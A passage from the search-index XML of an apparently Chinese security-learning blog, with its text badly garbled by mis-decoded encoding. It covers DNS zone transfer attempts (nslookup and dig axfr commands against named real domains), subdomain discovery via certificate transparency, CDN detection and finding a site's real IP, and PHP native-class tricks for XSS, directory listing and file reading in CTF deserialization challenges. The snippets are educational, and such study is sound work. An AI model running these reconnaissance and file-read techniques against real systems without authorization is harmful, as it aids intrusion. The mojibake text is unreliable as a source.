text"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä½¿ç”¨nslookupæ¥è§£æwikiæ—¶å³ä½¿å…¶å‰ä¸€æ®µå­åŸŸåä¸ºéšä¾¿ä¹±æ‰“çš„ä¹Ÿä¼šè¢«è§£æ<br>ä½†æ˜¯å½“æ­£å¸¸è§£ææ—¶å¦‚ç™¾åº¦ï¼Œæˆ‘ä»¬ä¼šå‘ç°æ— æ³•è§£ææˆåŠŸã€‚</p><h2 id="DNSåŸŸä¼ é€"><a href="#DNSåŸŸä¼ é€" class="headerlink" title="DNSåŸŸä¼ é€"></a>DNSåŸŸä¼ é€</h2><p>DNSæœåŠ¡å™¨åˆ†ä¸ºï¼šä¸»æœåŠ¡å™¨ã€å¤‡ä»½æœåŠ¡å™¨å’Œç¼“å­˜æœåŠ¡å™¨ã€‚</p><p>åœ¨ä¸»å¤‡æœåŠ¡å™¨ä¹‹é—´åŒæ­¥æ•°æ®åº“ï¼Œéœ€è¦ä½¿ç”¨â€œDNSåŸŸä¼ é€â€çš„ä¸€ç§DNSäº‹åŠ¡ã€‚åŸŸä¼ é€æ˜¯æŒ‡å¤‡ä»½æœåŠ¡å™¨ä»ä¸»æœåŠ¡å™¨ä¸Šå¤åˆ¶æ•°æ®ï¼Œç„¶åæ›´æ–°è‡ªèº«çš„æ•°æ®åº“ï¼Œä»¥è¾¾åˆ°æ•°æ®åŒæ­¥çš„ç›®çš„ï¼Œè¿™æ ·æ˜¯ä¸ºäº†å¢åŠ å†—ä½™ï¼Œä¸€æ—¦ä¸»æœåŠ¡å™¨å‡ºç°é—®é¢˜å¯ç›´æ¥è®©å¤‡ä»½æœåŠ¡å™¨åšå¥½æ”¯æ’‘å·¥ä½œã€‚</p><p>è‹¥DNSé…ç½®ä¸å½“ï¼Œå¯èƒ½å¯¼è‡´åŒ¿åç”¨æˆ·è·å–æŸä¸ªåŸŸçš„æ‰€æœ‰è®°å½•ã€‚é€ æˆæ•´ä¸ªç½‘ç»œçš„æ‹“æ‰‘ç»“æ„æ³„éœ²ç»™æ½œåœ¨çš„æ”»å‡»è€…ï¼ŒåŒ…æ‹¬ä¸€äº›å®‰å…¨æ€§è¾ƒä½çš„å†…éƒ¨ä¸»æœºï¼Œå¦‚æµ‹è¯•æœåŠ¡å™¨ã€‚å‡­å€Ÿè¿™ä»½ç½‘ç»œè“å›¾ï¼Œæ”»å‡»è€…å¯ä»¥èŠ‚çœå¾ˆå°‘çš„æ‰«ææ—¶é—´ã€‚</p><p>é”™è¯¯é…ç½®ï¼šåªè¦æ”¶åˆ°axfrè¯·æ±‚å°±è¿›è¡ŒåŸŸä¼ é€ï¼Œåˆ·æ–°æ•°æ®ã€‚</p><h3 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥è¯¢nameserver  </span><br><span class="line">nslookup -type=ns fafu.edu.cn 8.8.8.8  </span><br><span class="line"># æŒ‡å®šnameserverï¼Œåˆ—ä¸¾åŸŸåä¿¡æ¯  </span><br><span class="line">nslookup  </span><br><span class="line"># Server å‘½ä»¤å‚æ•°è®¾å®šæŸ¥è¯¢å°†è¦ä½¿ç”¨çš„DNSæœåŠ¡å™¨  </span><br><span class="line">server cloudy.dnspod.net   </span><br><span class="line">#  Lså‘½ä»¤åˆ—å‡ºæŸä¸ªåŸŸä¸­çš„æ‰€æœ‰åŸŸå  </span><br><span class="line">ls fafu.edu.cn</span><br></pre></td></tr></table></figure><img src="/2024/03/12/%E5%88%9D%E6%8E%A2%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/3.png" class="" title="alt text"><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶æ— æ³•ä¼ é€å‡ºæ¥å³æ²¡æœ‰è¿™ä¸ªæ¼æ´</p><h3 id="Dig"><a href="#Dig" class="headerlink" title="Dig"></a>Dig</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># æ‰¾åˆ°NSæœåŠ¡å™¨</span><br><span class="line">dig nhtc.wiki ns</span><br><span class="line"># å‘é€axfrè¯·æ±‚ </span><br><span class="line">dig axfr @cloudy.dnspod.net nhtc.wiki</span><br></pre></td></tr></table></figure><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒDNSæœåŠ¡å™¨é…ç½®éƒ½æ­£å¸¸ï¼Œå…³é—­äº†åŸŸä¼ é€æˆ–è®¾ç½®ç™½åå•ï¼Œåˆ©ç”¨ç‡ä½ã€‚æ¨èäº¤ç»™è‡ªåŠ¨åŒ–ã€‚</p><h2 id="è¯ä¹¦"><a href="#è¯ä¹¦" class="headerlink" title="è¯ä¹¦"></a>è¯ä¹¦</h2><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡è¯ä¹¦æ¥å¯¹å­åŸŸåè¿›è¡ŒæŸ¥è¯¢ï¼Œä¸€èˆ¬æŒ‚å–è¯¥å•ä½è¯ä¹¦çš„ä¸€èˆ¬æ˜¯å­åŸŸå<br>å› ä¸ºè¯ä¹¦é€æ˜æ€§æ˜¯å¼€æ”¾æ¶æ„ï¼Œå¯ä»¥æ£€æµ‹ç”±è¯ä¹¦é¢å‘æœºæ„é”™è¯¯é¢å‘çš„ SSL è¯ä¹¦ï¼Œä¹Ÿå¯ä»¥è¯†åˆ«æ¶æ„é¢å‘è¯ä¹¦çš„è¯ä¹¦é¢å‘æœºæ„ï¼Œä¸”ä»»ä½•äººéƒ½å¯ä»¥æ„å»ºæˆ–è®¿é—®ï¼ŒCAè¯ä¹¦åˆåŒ…å«äº†åŸŸåã€å­åŸŸåã€é‚®ç®±ç­‰æ•æ„Ÿä¿¡æ¯ï¼Œä»·å€¼å°±ä¸è¨€è€Œå–»äº†<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://crt.sh/</span><br><span class="line">https://www.entrust.com/ct-search/</span><br><span class="line">https://developers.facebook.com/tools/ct/</span><br><span class="line">https://spyse.com/search/certificate</span><br><span class="line">https://sslmate.com/certspotter/api/</span><br></pre></td></tr></table></figure></p><h2 id="åŸŸåå­˜æ´»æ£€æµ‹"><a href="#åŸŸåå­˜æ´»æ£€æµ‹" class="headerlink" title="åŸŸåå­˜æ´»æ£€æµ‹"></a>åŸŸåå­˜æ´»æ£€æµ‹</h2><h1 id="IPä¿¡æ¯æ”¶é›†"><a href="#IPä¿¡æ¯æ”¶é›†" class="headerlink" title="IPä¿¡æ¯æ”¶é›†"></a>IPä¿¡æ¯æ”¶é›†</h1><h2 id="1-ç»•è¿‡CDNè·å–çœŸå®ip"><a href="#1-ç»•è¿‡CDNè·å–çœŸå®ip" class="headerlink" title="1. ç»•è¿‡CDNè·å–çœŸå®ip"></a>1. ç»•è¿‡CDNè·å–çœŸå®ip</h2><p>CDNæ˜¯IPä¿¡æ¯æ¢æµ‹æˆ–æ‰“ç‚¹å¿…ä¸å¯ç»•è¿‡çš„ä¸€ä¸ªè¯é¢˜ã€‚å½“ç›®æ ‡ä½¿ç”¨äº†CDNåŠ é€Ÿï¼Œè·å–åˆ°çš„ç›®æ ‡ipä¸ä¸€å®šæ˜¯çœŸå®ipã€‚æ‰€ä»¥é€šå¸¸åœ¨å®æ–½ç«¯å£ã€æ¼æ‰«ç­‰æµ‹è¯•ä¹‹å‰ï¼Œéœ€åˆ¤æ–­ä¸‹æ˜¯å¦çœŸå®IPï¼Œæ˜¯å¦ä½¿ç”¨äº†CDNæˆ–å…¶ä»–ä»£ç†ç­‰ç­‰ï¼Œé¿å…æ— æ•ˆæ“ä½œã€èœœç½ã€éç›®æ ‡ç‚¹ã€‚<br>å¸¸è§CDNæœåŠ¡å•†<br>ä¸€ã€å›½å†… CDN æœåŠ¡å•†</p><p>é˜¿é‡Œäº‘ CDN<br>ç™¾åº¦äº‘ CDN<br>ä¸ƒç‰›äº‘ CDN<br>åˆæ‹äº‘ CDN<br>è…¾è®¯äº‘ CDN<br>Ucloud<br>360 CDN<br>ç½‘å®¿ç§‘æŠ€<br>ChinaCache<br>å¸è”ç§‘æŠ€<br>äºŒã€å›½å¤– CDN æœåŠ¡å•†</p><p>CloudFlare<br>StackPath<br>Fastly<br>Akamai<br>CloudFront<br>Edgecast<br>CDNetworks<br>Google Cloud CDN<br>CacheFly<br>Keycdn<br>Udomain<br>CDN77</p><h2 id="CDNåˆ¤æ–­"><a href="#CDNåˆ¤æ–­" class="headerlink" title="CDNåˆ¤æ–­"></a>CDNåˆ¤æ–­</h2><h3 id="å¤šping"><a href="#å¤šping" class="headerlink" title="å¤šping"></a>å¤šping</h3><p>é€šè¿‡å¤šåœ°pingç›®æ ‡åŸŸåï¼Œå¦‚æœæ²¡æœ‰ä½¿ç”¨CDNï¼Œåªä¼šæ˜¾ç¤ºä¸€ä¸ªIPåœ°å€ï¼Œæˆ–è€…åŒçº¿æ¥å…¥æƒ…å†µçš„ä¸¤ä¸ªä¸åŒè¿è¥å•†ipã€‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://ping.chinaz.com/</span><br><span class="line">https://ping.aizhan.com/</span><br><span class="line">http://www.webkaka.com/Ping.aspx</span><br><span class="line">https://www.host-tracker.com/v3/check/</span><br></pre></td></tr></table></figure><br>é€šè¿‡å¤šåœ°pingç›®æ ‡åŸŸåï¼Œå¦‚æœæ²¡æœ‰ä½¿ç”¨CDNï¼Œåªä¼šæ˜¾ç¤ºä¸€ä¸ªIPåœ°å€ï¼Œæˆ–è€…åŒçº¿æ¥å…¥æƒ…å†µçš„ä¸¤ä¸ªä¸åŒè¿è¥å•†ipã€‚<br><img src="/2024/03/12/%E5%88%9D%E6%8E%A2%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/7.png" class="" title="alt text"></p><h3 id="nslookup-1"><a href="#nslookup-1" class="headerlink" title="nslookup"></a>nslookup</h3><p>è·å–åˆ°çš„DNSåŸŸåè§£æç»“æœä¸­è¿”å›å¤šä¸ªipçš„ï¼Œä¸€èˆ¬éƒ½æ˜¯å­˜åœ¨CDNæœåŠ¡ã€‚<br><img src="/2024/03/12/%E5%88%9D%E6%8E%A2%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/8.png" class="" title="alt text"></p><h3 id="headerå¤´ä¿¡æ¯"><a href="#headerå¤´ä¿¡æ¯" class="headerlink" title="headerå¤´ä¿¡æ¯"></a>headerå¤´ä¿¡æ¯</h3><p>è¯·æ±‚å“åº”åŒ…headerå¤´ä¸­æ˜¯å¦å­˜åœ¨cdnæœåŠ¡å•†ä¿¡æ¯<br>æŠ¥é”™ä¿¡æ¯<br>è‹¥ asp æˆ–è€… asp.net ç½‘ç«™è¿”å›å¤´çš„ server ä¸æ˜¯ IISã€è€Œæ˜¯ Nginxï¼Œåˆ™å¤šåŠä½¿ç”¨äº†nginxåå‘ä»£ç†åˆ° CDN</p><h3 id="åœ¨çº¿æ£€æµ‹å·¥å…·"><a href="#åœ¨çº¿æ£€æµ‹å·¥å…·" class="headerlink" title="åœ¨çº¿æ£€æµ‹å·¥å…·"></a>åœ¨çº¿æ£€æµ‹å·¥å…·</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.cdnplanet.com/tools/cdnfinder/</span><br><span class="line">https://tools.ipip.net/cdn.php</span><br><span class="line">https://whatsmycdn.com/</span><br></pre></td></tr></table></figure><img src="/2024/03/12/%E5%88%9D%E6%8E%A2%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/10.png" class="" title="alt text"><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å½“æŸ¥è¯¢çš„ç½‘ç«™å­˜åœ¨CDNåŠ é€Ÿå°±ä¼šæŸ¥åˆ°å¾ˆå¤šå¥‡æ€ªçš„ä¸œè¥¿ã€‚</p><h3 id="IPåæŸ¥-1"><a href="#IPåæŸ¥-1" class="headerlink" title="IPåæŸ¥"></a>IPåæŸ¥</h3><p>çœ‹çœ‹æ˜¯å¦ä¼šæŸ¥åˆ°å¤§é‡ä¸ç›¸å¹²çš„åŸŸå<br><img src="/2024/03/12/%E5%88%9D%E6%8E%A2%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/9.png" class="" title="alt text"><br>å¯ä»¥çœ‹åˆ°baiduåº”è¯¥æ˜¯ä½¿ç”¨äº†CDNåŠ é€Ÿ</p><h2 id="è·å–çœŸå®IP"><a href="#è·å–çœŸå®IP" class="headerlink" title="è·å–çœŸå®IP"></a>è·å–çœŸå®IP</h2><h3 id="dnså†å²ç»‘å®šè®°å½•"><a href="#dnså†å²ç»‘å®šè®°å½•" class="headerlink" title="dnså†å²ç»‘å®šè®°å½•"></a>dnså†å²ç»‘å®šè®°å½•</h3><p>æŸ¥è¯¢åŸŸåå†å²è§£æè®°å½•ï¼Œå¯èƒ½ä¼šå­˜åœ¨æœªä½¿ç”¨cdnä¹‹å‰çš„çœŸå®ipè®°å½•ï¼š<br>é¦–å…ˆæŸ¥çœ‹ä¸€ä¸ªåŸŸåæ˜¯å¦ä½¿ç”¨äº†CDNåŠ é€Ÿ<br>ç„¶åä½¿ç”¨åœ¨çº¿å·¥å…·æŸ¥çœ‹å†å²ip<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://viewdns.info/iphistory/?domain=</span><br><span class="line">https://dnsdb.io/zh-cn/</span><br><span class="line">https://securitytrails.com/</span><br><span class="line">https://x.threatbook.cn/</span><br><span class="line">http://toolbar.netcraft.com/site_report?url=</span><br><span class="line">https://site.ip138.com/www.xxx.com/</span><br></pre></td></tr></table></figure><br><img src="/2024/03/12/%E5%88%9D%E6%8E%A2%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/11.png" class="" title="alt text"><br>ä½¿ç”¨<br><code>view-source:</code>ä¸€ä¸ªä¸ªæŸ¥çœ‹ipå¦‚æœå›æ˜¾æºç åˆ™ä¸ºçœŸå®ip</p>]]></content>
      
      
      <categories>
          
          <category> æ”»é˜² </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ”»é˜² </tag>
            
            <tag> å¤–ç½‘ä¿¡æ¯æ”¶é›† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆæ¢phpåŸç”Ÿç±»çš„åˆ©ç”¨</title>
      <link href="/2024/03/11/%E5%88%9D%E6%8E%A2php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/"/>
      <url>/2024/03/11/%E5%88%9D%E6%8E%A2php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="åŒæ ·æ˜¯å› ä¸ºåœ¨æ ¡èµ›é‡åˆ°äº†æœ‰å…³phpååºåˆ—åŒ–åŸç”Ÿç±»çš„æ–‡ç« ï¼Œæ‰€ä»¥æˆ‘å†™ä¸‹äº†è¿™ç¯‡æ–‡ç« ã€‚"><a href="#åŒæ ·æ˜¯å› ä¸ºåœ¨æ ¡èµ›é‡åˆ°äº†æœ‰å…³phpååºåˆ—åŒ–åŸç”Ÿç±»çš„æ–‡ç« ï¼Œæ‰€ä»¥æˆ‘å†™ä¸‹äº†è¿™ç¯‡æ–‡ç« ã€‚" class="headerlink" title="åŒæ ·æ˜¯å› ä¸ºåœ¨æ ¡èµ›é‡åˆ°äº†æœ‰å…³phpååºåˆ—åŒ–åŸç”Ÿç±»çš„æ–‡ç« ï¼Œæ‰€ä»¥æˆ‘å†™ä¸‹äº†è¿™ç¯‡æ–‡ç« ã€‚"></a>åŒæ ·æ˜¯å› ä¸ºåœ¨æ ¡èµ›é‡åˆ°äº†æœ‰å…³phpååºåˆ—åŒ–åŸç”Ÿç±»çš„æ–‡ç« ï¼Œæ‰€ä»¥æˆ‘å†™ä¸‹äº†è¿™ç¯‡æ–‡ç« ã€‚</h1><p>phpåŸç”Ÿç±»åˆ†ä¸ºå¤šç§ï¼Œå¦‚ä¸‹ã€‚</p><h1 id="åˆ©ç”¨Errorç±»å’ŒExceptionç±»æ¥å®ç°xssæ¼æ´ã€‚"><a href="#åˆ©ç”¨Errorç±»å’ŒExceptionç±»æ¥å®ç°xssæ¼æ´ã€‚" class="headerlink" title="åˆ©ç”¨Errorç±»å’ŒExceptionç±»æ¥å®ç°xssæ¼æ´ã€‚"></a>åˆ©ç”¨Errorç±»å’ŒExceptionç±»æ¥å®ç°xssæ¼æ´ã€‚</h1><p>Errorç±»æ˜¯åœ¨php7ä¸‹å­˜åœ¨çš„ä¸€ä¸ªå†…ç½®ç±»ï¼Œæ˜¯æ‰€æœ‰PHPå†…éƒ¨é”™è¯¯ç±»çš„åŸºç±»ï¼Œé‚£è¿™å’ŒXSSå’Œä»€ä¹ˆå…³ç³»å‘¢ï¼Ÿé‚£æ˜¯å› ä¸ºè¿™ä¸ªç±»ä¸­æœ‰ä¸€ä¸ªå†…ç½®æ–¹æ³•ï¼Œå«åš__toString()çš„é­”æœ¯æ–¹æ³•ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“å½“æŠŠå¯¹è±¡å½“æˆå­—ç¬¦ä¸²çš„æ—¶å€™å®ƒå°±ä¼šè‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œè€Œå®ƒä¼šå°†Errorä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¡¨è¾¾å‡ºæ¥ï¼›é‚£ä¹ˆå‡å¦‚æœ‰ä¸€ä¸ªechoå°†å®ƒè¾“å‡ºå‡ºæ¥ï¼Œè€Œè¾“å‡ºå†…å®¹æ˜¯æˆ‘ä»¬æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥ç”¨<code>&lt;script&gt;æ ‡ç­¾æ¥æ‰§è¡Œjsä»£ç äº†</code></p><h2 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h2><img src="/2024/03/11/%E5%88%9D%E6%8E%A2php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/1.png" class="" title="alt text"><img src="/2024/03/11/%E5%88%9D%E6%8E%A2php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/2.png" class="" title="alt text"><img src="/2024/03/11/%E5%88%9D%E6%8E%A2php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/3.png" class="" title="alt text"><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶ç¨‹åºè¿è¡Œç»“æœå‡ºç°äº†xssæ¼æ´ã€‚è¿™æ˜¯å› ä¸ºå…¶__toStringæ–¹æ³•ç›´æ¥å°†Errorä¸­çš„å­—ç¬¦ä¸²è¾“å‡ºåˆ°äº†æµè§ˆå™¨ä¸­å¯¼è‡´çš„ã€‚<br>æ³¨æ„ç»è¿‡ååºåˆ—åŒ–ä¹‹åçš„åœ¨è¢«è¾“å‡ºæ—¶ä¹Ÿä¼šè¾“å‡ºå…¶å®šä¹‰çš„å­—ç¬¦ä¸²ã€‚</p><h1 id="éå†æ–‡ä»¶ç›®å½•ç±»"><a href="#éå†æ–‡ä»¶ç›®å½•ç±»" class="headerlink" title="éå†æ–‡ä»¶ç›®å½•ç±»"></a>éå†æ–‡ä»¶ç›®å½•ç±»</h1><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸‹å‡ ç§åŸç”Ÿç±»å¯¹æ–‡ä»¶è¿›è¡Œéå†<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DirectoryIterator </span><br><span class="line">FilesystemIterator </span><br><span class="line">GlobIterator </span><br></pre></td></tr></table></figure><br>ä¸Šé¢ä¸‰ç§åŸç”Ÿç±»çš„åŠŸèƒ½ç›¸å·®ä¸å¤šéƒ½å¯ä»¥å¯¹ç›®å½•è¿›è¡Œéå†ï¼Œå½“toStringè¢«è§¦å‘æ—¶éƒ½ä¼šè¾“å‡ºå½“å‰æ–‡ä»¶å¤¹çš„ç¬¬ä¸€æ–‡ä»¶åã€‚ä¸€èˆ¬ä¼šä»¥éå†çš„å½¢å¼å‡ºç°åœ¨ctfèµ›é¢˜ä¸­ã€‚<br>åœ¨éå†æ—¶ä¼šè¾“å‡ºè¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åå¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$b</span>)</span><br><span class="line">    <span class="keyword">echo</span> (<span class="variable">$b</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure><br><img src="/2024/03/11/%E5%88%9D%E6%8E%A2php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/4.png" class="" title="alt text"><br>æœªéå†æ—¶åªä¼šè¾“å‡ºä¸€ä¸ªæ–‡ä»¶åã€‚<br>å¯ä»¥æ­é…glob://åè®®æ¥ä½¿ç”¨</p><h1 id="æ–‡ä»¶è¯»å–ç±»"><a href="#æ–‡ä»¶è¯»å–ç±»" class="headerlink" title="æ–‡ä»¶è¯»å–ç±»"></a>æ–‡ä»¶è¯»å–ç±»</h1><h2 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h2><p>è¿™ä¸ªåŸç”Ÿç±»å¯ä»¥å¯¹æ–‡ä»¶è¿›è¡Œè¯»å–å…¶ä½¿ç”¨æ–¹æ³•ä»ç„¶æ˜¯è§¦å‘__toString<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a=new SplFileObject(&#x27;/app_config.txt&#x27;);</span><br><span class="line">    echo ($a.&#x27;&lt;br&gt;&#x27;);</span><br></pre></td></tr></table></figure><br>åƒè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è§¦å‘SplFileObjectè¾“å‡ºæ–‡ä»¶å†…å®¹<br>æ³¨æ„SplFileObjectç­‰åŸç”Ÿç±»éƒ½éœ€å…ˆå®ä¾‹åŒ–ä¸ºå¯¹è±¡å†è¿›è¡Œè§¦å‘æ‰èƒ½è§¦å‘æˆåŠŸã€‚</p><h1 id="SoapClient-ç±»"><a href="#SoapClient-ç±»" class="headerlink" title="SoapClient ç±»"></a>SoapClient ç±»</h1><p>è¿™ä¸ªç±»å¯ä»¥è§¦å‘SSRFç”±äºæˆ‘å¯¹SSRFä¸æ˜¯ç‰¹åˆ«äº†è§£æ‰€ä»¥å…ˆæŒ–ä¸ªå‘ä»¥åå†å¡«ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
          <category> åŸç”Ÿç±» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phpåŸç”Ÿç±» </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpååºåˆ—åŒ–ä¹‹å­—ç¬¦ä¸²é€ƒé€¸</title>
      <link href="/2024/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/"/>
      <url>/2024/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="webçš„ä¿¡æ¯æ”¶é›†å†…å®¹å¤ªå¤šäº†å­¦çš„æˆ‘å¤´ç–¼ï¼Œæ‰€ä»¥æˆ‘æƒ³å†™ä¸€ä¸‹è¿™ä¸ªphpååºåˆ—åŒ–çš„å­—ç¬¦ä¸²é€ƒé€¸ã€‚"><a href="#webçš„ä¿¡æ¯æ”¶é›†å†…å®¹å¤ªå¤šäº†å­¦çš„æˆ‘å¤´ç–¼ï¼Œæ‰€ä»¥æˆ‘æƒ³å†™ä¸€ä¸‹è¿™ä¸ªphpååºåˆ—åŒ–çš„å­—ç¬¦ä¸²é€ƒé€¸ã€‚" class="headerlink" title="webçš„ä¿¡æ¯æ”¶é›†å†…å®¹å¤ªå¤šäº†å­¦çš„æˆ‘å¤´ç–¼ï¼Œæ‰€ä»¥æˆ‘æƒ³å†™ä¸€ä¸‹è¿™ä¸ªphpååºåˆ—åŒ–çš„å­—ç¬¦ä¸²é€ƒé€¸ã€‚"></a>webçš„ä¿¡æ¯æ”¶é›†å†…å®¹å¤ªå¤šäº†å­¦çš„æˆ‘å¤´ç–¼ï¼Œæ‰€ä»¥æˆ‘æƒ³å†™ä¸€ä¸‹è¿™ä¸ªphpååºåˆ—åŒ–çš„å­—ç¬¦ä¸²é€ƒé€¸ã€‚</h1><h1 id="å­—ç¬¦å¢å¤šçš„é€ƒé€¸"><a href="#å­—ç¬¦å¢å¤šçš„é€ƒé€¸" class="headerlink" title="å­—ç¬¦å¢å¤šçš„é€ƒé€¸"></a>å­—ç¬¦å¢å¤šçš„é€ƒé€¸</h1><p>å­—ç¬¦ä¸²é€ƒé€¸çš„æˆå› æ˜¯wafå°†ä¸€äº›æ•æ„Ÿå­—ç¬¦è¿›è¡Œäº†ä¸€äº›æ›¿æ¢å¯¼è‡´äº†å­—ç¬¦ä¸²çš„å­—ç¬¦æ•°é‡çš„å¢å¤šå‡å°‘ã€‚å¦‚ä¸‹é¢çš„ä»£ç <br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">black_list</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$str</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/flag/i&#x27;</span>,<span class="string">&#x27;hacker&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å¯ä»¥çœ‹åˆ°ä¸Šé¢çš„ä»£ç å›å°†flagæ”¹ä¸ºhackeré‚£ä¹ˆè¿™ä¸ªå­—ç¬¦æ•°é‡å°±å¤šäº†ä¸¤ä¸ªï¼Œé‚£ä¹ˆæˆ‘ä»¬æ€è€ƒä¸€äº›ï¼Œå¦‚æœwafå¯¹æˆ‘ä»¬ä¼ å…¥çš„popé“¾è¿›è¡Œå­—ç¬¦æ›¿æ¢é‚£ä¹ˆä¼šå‘ç”Ÿä»€ä¹ˆå‘¢?æ¯”å¦‚æˆ‘ä»¬ååºåˆ—çš„popé“¾ä¸º<code>O:1:&quot;E&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;flag&quot;;&#125;</code>é‚£ä¹ˆè¿™ä¸ªå†ç»è¿‡black_listçš„å¤„ç†åå°±ä¼šå˜ä¸º<code>O:1:&quot;E&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;hacker&quot;;&#125;</code>é‚£ä¹ˆè¿™æ˜¯æ—¶å€™æˆ‘ä»¬æ˜¯æ— æ³•è¿›è¡Œååºåˆ—çš„ï¼Œå› ä¸ºsçš„æ•°é‡å°äºå­—ç¬¦æ•°ã€‚é‚£ä¹ˆæˆ‘ä»¬å­—ç¬¦ä¸²é€ƒé€¸æ˜¯æ€ä¹ˆé€ æˆçš„å‘¢?</p><h2 id="å­—ç¬¦é€ƒé€¸çš„åŸç†"><a href="#å­—ç¬¦é€ƒé€¸çš„åŸç†" class="headerlink" 